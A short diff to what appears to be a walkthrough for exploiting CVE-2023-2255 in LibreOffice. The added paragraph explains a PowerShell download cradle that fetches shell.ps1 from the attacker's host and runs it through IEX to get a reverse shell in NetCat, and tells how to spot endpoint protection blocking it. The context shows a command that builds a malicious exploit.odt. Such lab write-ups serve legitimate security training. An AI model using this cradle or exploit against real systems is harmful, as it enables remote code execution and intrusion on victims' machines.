@@ -305,6 +305,8 @@ This should output a base64 code:
 
 <img width="1912" height="83" alt="image" src="https://github.com/user-attachments/assets/cf6620ad-98c4-4c3a-9c83-1cba2fe46bb1" />
 
+Now what we just did was building a cradle. This (New-Object Net.WebClient).DownloadString('http://<your-ip>:8000/shell.ps1') downloads opens a .NET webclient and downloads shell.ps1 as a string. Next, IEX (Invoke-Expression) takes a powershell code in string format and executes it as powershell code. This is usefull because the extra step allows us to see if we are able get to the server to make the request for shell.ps1 and if that actually happens, but no reverse shell comes back to NetCat, we can suspect endpoint protection is interfering with shell.ps1 execution.
+
 Next, copy and execute this command:
 ```bash
 python CVE-2023-2255.py --cmd 'cmd /c powershell -enc <your-cradle>' --output exploit.odt
